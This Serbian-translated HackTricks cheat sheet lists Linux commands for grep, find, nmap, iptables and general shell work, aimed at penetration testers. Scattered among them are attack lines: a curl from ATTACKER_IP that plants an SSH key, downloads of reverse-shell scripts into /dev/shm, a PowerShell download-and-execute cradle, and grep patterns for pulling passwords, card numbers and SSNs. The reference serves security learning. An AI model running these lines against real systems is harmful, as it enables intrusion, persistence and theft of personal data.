# Korisne Linux komande

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uobičajene Bash komande
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash za Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Grep je moćan alat za pretragu i filtriranje teksta. Koristi se za pronalaženje linija teksta koje odgovaraju određenom obrascu. Evo nekoliko korisnih grep komandi:

- `grep pattern file`: Pretražuje datoteku za linije koje sadrže određeni obrazac.
- `grep -i pattern file`: Pretražuje datoteku za linije koje sadrže određeni obrazac, bez obzira na veličinu slova.
- `grep -v pattern file`: Pretražuje datoteku za linije koje ne sadrže određeni obrazac.
- `grep -r pattern directory`: Rekurzivno pretražuje direktorijum i sve poddirektorijume za linije koje sadrže određeni obrazac.
- `grep -l pattern file`: Ispisuje samo imena datoteka koje sadrže određeni obrazac.
- `grep -n pattern file`: Ispisuje linije koje sadrže određeni obrazac, zajedno sa brojevima linija.
- `grep -E pattern file`: Koristi proširene regularne izraze za pretragu datoteke.
- `grep -o pattern file`: Ispisuje samo podudarajući deo linije koji odgovara određenom obrascu.
- `grep -c pattern file`: Broji koliko puta se određeni obrazac pojavljuje u datoteci.

Ove grep komande su samo osnovne, ali mogu biti vrlo korisne prilikom pretrage i filtriranja teksta.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Pronađi

---

### Find Files by Name

### Pronađi fajlove po imenu

To find files in Linux based on their names, you can use the `find` command. The basic syntax is as follows:

Da biste pronašli fajlove u Linuxu na osnovu njihovih imena, možete koristiti `find` komandu. Osnovna sintaksa je sledeća:

```bash
find <directory> -name "<filename>"
```

Replace `<directory>` with the directory where you want to start the search, and `<filename>` with the name of the file you are looking for. You can use wildcards (`*`) to match multiple files or parts of a filename.

Zamenite `<directory>` direktorijumom u kojem želite da započnete pretragu, a `<filename>` imenom fajla koji tražite. Možete koristiti džokere (`*`) da biste pronašli više fajlova ili delove imena fajla.

For example, to find all files with the extension `.txt` in the current directory, you can use the following command:

Na primer, da biste pronašli sve fajlove sa ekstenzijom `.txt` u trenutnom direktorijumu, možete koristiti sledeću komandu:

```bash
find . -name "*.txt"
```

This will search for all files ending with `.txt` in the current directory and its subdirectories.

Ovo će pretražiti sve fajlove koji se završavaju sa `.txt` u trenutnom direktorijumu i njegovim poddirektorijumima.

### Find Files by Type

### Pronađi fajlove po tipu

To find files based on their type, you can use the `-type` option with the `find` command. The syntax is as follows:

Da biste pronašli fajlove na osnovu njihovog tipa, možete koristiti opciju `-type` sa `find` komandom. Sintaksa je sledeća:

```bash
find <directory> -type <filetype>
```

Replace `<directory>` with the directory where you want to start the search, and `<filetype>` with the type of file you are looking for. Some common file types are:

Zamenite `<directory>` direktorijumom u kojem želite da započnete pretragu, a `<filetype>` tipom fajla koji tražite. Neki uobičajeni tipovi fajlova su:

- `f` for regular files
- `d` for directories
- `l` for symbolic links
- `c` for character devices
- `b` for block devices
- `p` for named pipes
- `s` for sockets

- `f` za obične fajlove
- `d` za direktorijume
- `l` za simboličke veze
- `c` za karakteristične uređaje
- `b` za blok uređaje
- `p` za imenovane cevi
- `s` za sokete

For example, to find all directories in the current directory, you can use the following command:

Na primer, da biste pronašli sve direktorijume u trenutnom direktorijumu, možete koristiti sledeću komandu:

```bash
find . -type d
```

This will search for all directories in the current directory and its subdirectories.

Ovo će pretražiti sve direktorijume u trenutnom direktorijumu i njegovim poddirektorijumima.

### Find Files by Size

### Pronađi fajlove po veličini

To find files based on their size, you can use the `-size` option with the `find` command. The syntax is as follows:

Da biste pronašli fajlove na osnovu njihove veličine, možete koristiti opciju `-size` sa `find` komandom. Sintaksa je sledeća:

```bash
find <directory> -size <size>
```

Replace `<directory>` with the directory where you want to start the search, and `<size>` with the size of the file you are looking for. You can specify the size in bytes (`b`), kilobytes (`k`), megabytes (`M`), gigabytes (`G`), or terabytes (`T`).

Zamenite `<directory>` direktorijumom u kojem želite da započnete pretragu, a `<size>` veličinom fajla koji tražite. Možete navesti veličinu u bajtovima (`b`), kilobajtima (`k`), megabajtima (`M`), gigabajtima (`G`) ili terabajtima (`T`).

For example, to find all files larger than 1 megabyte in the current directory, you can use the following command:

Na primer, da biste pronašli sve fajlove veće od 1 megabajta u trenutnom direktorijumu, možete koristiti sledeću komandu:

```bash
find . -size +1M
```

This will search for all files larger than 1 megabyte in the current directory and its subdirectories.

Ovo će pretražiti sve fajlove veće od 1 megabajta u trenutnom direktorijumu i njegovim poddirektorijumima.
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap pretraga pomoć

Nmap je moćan alat za skeniranje mreže koji se koristi za otkrivanje otvorenih portova, identifikaciju servisa koji rade na tim portovima i mapiranje mrežne topologije. Ovde su neki korisni Nmap parametri koji vam mogu pomoći u vašim pretragama:

- `-p <portovi>`: Određuje specifične portove koje želite da skenirate. Možete navesti pojedinačne portove ili opseg portova, na primer `-p 80` ili `-p 1-100`.

- `-sS`: Vrši TCP SYN skeniranje, koje je brže od standardnog TCP skeniranja. Ovaj parametar se koristi za otkrivanje otvorenih portova.

- `-sU`: Vrši UDP skeniranje, koje se koristi za otkrivanje otvorenih UDP portova.

- `-O`: Pokušava identifikovati operativni sistem ciljnog računara na osnovu karakteristika mrežnog protokola.

- `-A`: Izvršava detaljan skeniranje, uključujući otkrivanje operativnog sistema, verzije servisa i druge informacije.

- `-v`: Prikazuje detaljnije informacije o skeniranju.

- `-oN <ime_fajla>`: Snima rezultate skeniranja u određeni fajl.

Ovo su samo neki od parametara koje možete koristiti sa Nmap-om. Za više informacija o Nmap-u i njegovim mogućnostima, možete pogledati zvaničnu dokumentaciju.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash (Bourne Again SHell) je popularan interpreter komandne linije i skripting jezik koji se često koristi u Linux okruženju. Ovde su neke korisne komande koje možete koristiti u Bash-u:

- `ls`: Prikazuje sadržaj trenutnog direktorijuma.
- `cd`: Menja trenutni direktorijum.
- `pwd`: Prikazuje putanju do trenutnog direktorijuma.
- `mkdir`: Kreira novi direktorijum.
- `rm`: Briše fajl ili direktorijum.
- `cp`: Kopira fajl ili direktorijum.
- `mv`: Premešta fajl ili direktorijum.
- `cat`: Prikazuje sadržaj fajla.
- `grep`: Pretražuje fajl za određeni tekst.
- `chmod`: Menja dozvole pristupa fajlovima i direktorijumima.
- `chown`: Menja vlasnika fajla ili direktorijuma.
- `ps`: Prikazuje aktivne procese.
- `kill`: Prekida izvršavanje procesa.
- `top`: Prikazuje informacije o trenutno aktivnim procesima.
- `history`: Prikazuje istoriju komandi koje su izvršene.

Ovo su samo neke od mnogih korisnih komandi koje možete koristiti u Bash-u. Bash pruža mnoge mogućnosti za automatizaciju zadataka i manipulaciju sistemom, pa je važno da se upoznate sa ovim komandama kako biste efikasno radili u Linux okruženju.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables je alat za konfigurisanje firewall-a u Linux operativnom sistemu. Koristi se za kontrolu ulaznog i izlaznog saobraćaja na mreži, kao i za filtriranje paketa na osnovu različitih kriterijuma.

### Osnovne komande

- `iptables -L`: Prikazuje trenutna pravila firewall-a.
- `iptables -F`: Briše sva pravila iz firewall-a.
- `iptables -A`: Dodaje novo pravilo u firewall.
- `iptables -D`: Briše postojeće pravilo iz firewall-a.
- `iptables -P`: Postavlja podrazumevano ponašanje firewall-a.

### Pravila

Pravila u iptables-u se sastoje od različitih delova koji definišu uslove filtriranja paketa. Evo nekoliko osnovnih delova pravila:

- `--source`: Definiše izvor paketa.
- `--destination`: Definiše odredište paketa.
- `--protocol`: Definiše protokol koji se koristi (npr. TCP, UDP, ICMP).
- `--sport`: Definiše izvorni port paketa.
- `--dport`: Definiše odredišni port paketa.
- `--in-interface`: Definiše ulazno mrežno sučelje.
- `--out-interface`: Definiše izlazno mrežno sučelje.

### Primeri

Evo nekoliko primera kako se koriste komande iptables:

- `iptables -A INPUT -p tcp --dport 22 -j ACCEPT`: Ovo pravilo dozvoljava ulazni TCP saobraćaj na portu 22 (SSH).
- `iptables -A OUTPUT -p udp --dport 53 -j ACCEPT`: Ovo pravilo dozvoljava izlazni UDP saobraćaj na portu 53 (DNS).
- `iptables -A INPUT -s 192.168.0.0/24 -j DROP`: Ovo pravilo blokira sav ulazni saobraćaj sa IP adrese 192.168.0.0/24.

### Napomena

Nakon što se pravila dodaju ili promene, potrebno je sačuvati ih kako bi bila trajna. U suprotnom, pravila će biti izgubljena prilikom restartovanja sistema. Da biste sačuvali pravila, možete koristiti komandu `iptables-save` i sačuvati rezultat u odgovarajući konfiguracioni fajl.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
